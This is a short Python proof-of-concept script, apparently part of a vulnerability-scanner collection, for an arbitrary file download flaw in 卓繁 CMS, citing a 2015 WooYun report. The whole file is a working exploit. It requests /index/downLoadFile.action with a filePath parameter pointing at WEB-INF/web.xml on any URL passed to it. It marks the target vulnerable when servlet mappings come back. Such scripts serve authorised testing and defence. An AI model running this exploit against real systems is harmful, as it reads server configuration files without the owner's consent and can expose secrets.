#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 卓繁cms任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-54074
author: Lucifer
description: 文件/index/downLoadFile.action中,参数filePath存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result = ['卓繁cms任意文件下载漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index/downLoadFile.action?fileName=web.xml&filePath=WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<servlet-mapping>" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
